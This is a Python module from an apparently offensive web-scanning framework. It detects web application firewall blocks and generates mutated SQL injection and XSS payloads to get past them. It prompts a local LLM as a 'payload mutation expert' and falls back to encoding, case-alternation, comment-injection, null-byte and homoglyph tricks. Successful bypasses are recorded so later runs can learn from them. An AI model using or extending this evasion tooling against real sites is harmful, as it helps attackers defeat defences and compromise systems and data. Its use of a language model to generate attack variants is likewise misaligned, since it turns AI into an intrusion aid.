#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK v11.0 — WAF Bypass AI Layer
============================================

Uses the local LLM to generate novel payload mutations on-the-fly when
static bypass payloads are blocked (observed 403/406 responses).
Successful mutations are fed back to LearningStore.

This module wraps the existing evasion engine and augments it with
LLM-guided payload generation when standard techniques fail.

Usage::

    from core.waf_ai_bypass import WAFAIBypass
    bypass = WAFAIBypass(engine)
    new_payloads = bypass.mutate(payload, vuln_type, response)
"""

from __future__ import annotations

import logging
import re
from typing import TYPE_CHECKING, List, Optional

if TYPE_CHECKING:
    from core.engine import AtomicEngine

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# WAF block signal detection
# ---------------------------------------------------------------------------

WAF_BLOCK_STATUS_CODES = {403, 406, 429, 503, 400}

WAF_BLOCK_BODY_PATTERNS = [
    r"access\s+denied",
    r"blocked\s+by",
    r"waf",
    r"firewall",
    r"security\s+policy",
    r"request\s+rejected",
    r"malicious\s+request",
    r"suspicious\s+activity",
    r"cloudflare",
    r"mod_security",
    r"sucuri",
    r"akamai",
]

# LLM prompt template for mutation
MUTATION_PROMPT = """You are a payload mutation expert for security testing.
The following payload was blocked by a WAF:

Payload: {payload}
Vuln type: {vuln_type}
WAF response: {waf_indicator}

Generate 5 mutated variants of this payload that may bypass WAF detection.
Use techniques like: encoding variations, case changes, whitespace insertion,
comment injection, character substitution, concatenation splitting.

Output ONLY the payloads, one per line, no explanations."""

# Rule-based mutation fallbacks (when LLM unavailable)
def _rule_based_mutations(payload: str, vuln_type: str) -> List[str]:
    """Apply common WAF bypass transformations without LLM."""
    mutations = []
    p = payload

    # URL double-encoding
    mutations.append(p.replace("<", "%253C").replace(">", "%253E"))
    # Case alternation
    mutations.append("".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)))
    # HTML entity encoding (for XSS)
    if "script" in p.lower() or "<" in p:
        mutations.append(p.replace("<", "&#60;").replace(">", "&#62;"))
    # Comment injection (for SQLi)
    if "select" in p.lower() or "union" in p.lower():
        mutations.append(p.replace(" ", "/**/"))
        mutations.append(p.upper().replace(" ", "/**/"))
    # Null byte insertion
    mutations.append(p.replace(" ", " \x00"))
    # Unicode normalization
    mutations.append(p.replace("a", "\u0430").replace("e", "\u0435"))  # Cyrillic homoglyphs
    # Tab/newline substitution
    mutations.append(p.replace(" ", "\t"))

    # Remove duplicates and original
    seen = {p}
    result = []
    for m in mutations:
        if m not in seen and m.strip():
            seen.add(m)
            result.append(m)
    return result[:5]


class WAFAIBypass:
    """AI-augmented WAF bypass payload generator."""

    def __init__(self, engine: "AtomicEngine"):
        self.engine = engine
        self.verbose = engine.config.get("verbose", False)
        self._blocked_cache: dict = {}  # payload → True if blocked

    def is_waf_blocked(self, response) -> bool:
        """Detect if a response indicates WAF blocking."""
        if response is None:
            return False
        if response.status_code in WAF_BLOCK_STATUS_CODES:
            return True
        body = getattr(response, "text", "").lower()
        return any(
            re.search(p, body, re.IGNORECASE) for p in WAF_BLOCK_BODY_PATTERNS
        )

    def mutate(
        self,
        payload: str,
        vuln_type: str,
        blocked_response=None,
        n: int = 5,
    ) -> List[str]:
        """Generate WAF-bypass mutations for a blocked *payload*.

        First tries the local LLM, falls back to rule-based mutations.
        Successful mutations are recorded in the learning store.

        Args:
            payload:          The original blocked payload.
            vuln_type:        Vulnerability type (sqli, xss, etc.).
            blocked_response: The WAF-blocking response object.
            n:                Number of mutations to return.

        Returns:
            List of mutated payload strings.
        """
        if self.verbose:
            logger.info("[WAF-AI] Generating bypass mutations for: %s", payload[:50])

        waf_indicator = ""
        if blocked_response:
            waf_indicator = (
                f"HTTP {blocked_response.status_code} "
                + getattr(blocked_response, "text", "")[:200]
            )

        # Try LLM first
        llm = getattr(self.engine, "local_llm", None)
        if llm is not None:
            try:
                prompt = MUTATION_PROMPT.format(
                    payload=payload,
                    vuln_type=vuln_type,
                    waf_indicator=waf_indicator[:200],
                )
                raw = llm.generate(prompt, max_tokens=300)
                mutations = [
                    line.strip()
                    for line in raw.strip().splitlines()
                    if line.strip() and line.strip() != payload
                ][:n]
                if mutations:
                    return mutations
            except Exception as exc:
                logger.debug("[WAF-AI] LLM mutation failed: %s", exc)

        # Fallback: rule-based
        return _rule_based_mutations(payload, vuln_type)[:n]

    def record_success(self, payload: str, vuln_type: str):
        """Record a successful bypass mutation in the learning store."""
        learning = getattr(self.engine, "learning", None)
        if learning:
            try:
                learning.record_success(vuln_type, payload)
            except Exception:
                pass
        if self.verbose:
            logger.info("[WAF-AI] Bypass success recorded for payload: %s", payload[:50])
